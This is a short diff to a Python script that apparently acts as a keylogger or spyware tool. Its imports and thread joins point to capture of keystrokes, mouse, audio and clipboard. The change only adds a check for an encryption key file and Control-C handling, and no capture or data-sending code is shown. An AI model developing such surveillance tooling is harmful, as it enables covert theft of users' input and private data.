@@ -11,6 +11,7 @@ import socket
 import re
 import uuid
 import psutil
+import os
 
 from pynput import keyboard, mouse
 from pynput.keyboard import Key
@@ -166,5 +167,12 @@ def main():
         audio_thread.join()
         clipboard_thread.join()
 
-if __name__ == "__main__":
-    main()
+if __name__ == '__main__':
+    try:
+        if os.path.exists("keyfile.key"):
+            main()
+        else :
+            print("You forget to generate the Key x)")
+
+    except KeyboardInterrupt:
+        print(" Control-C entered...Program exiting ")
